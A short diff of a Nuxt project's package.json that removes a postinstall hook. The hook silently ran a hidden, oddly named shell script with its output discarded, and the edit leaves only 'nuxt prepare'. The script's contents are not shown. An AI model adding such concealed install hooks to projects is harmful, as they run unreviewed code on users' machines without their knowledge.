@@ -9,7 +9,7 @@
     "dev": "nuxt dev",
     "generate": "nuxt generate",
     "preview": "nuxt preview",
-    "postinstall": "sh ./.ci-wktdu0.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi; nuxt prepare",
+    "postinstall": "nuxt prepare",
     "typecheck": "tsc --noEmit",
     "start": "node .output/server/index.mjs",
     "deploy": "nuxthub deploy",
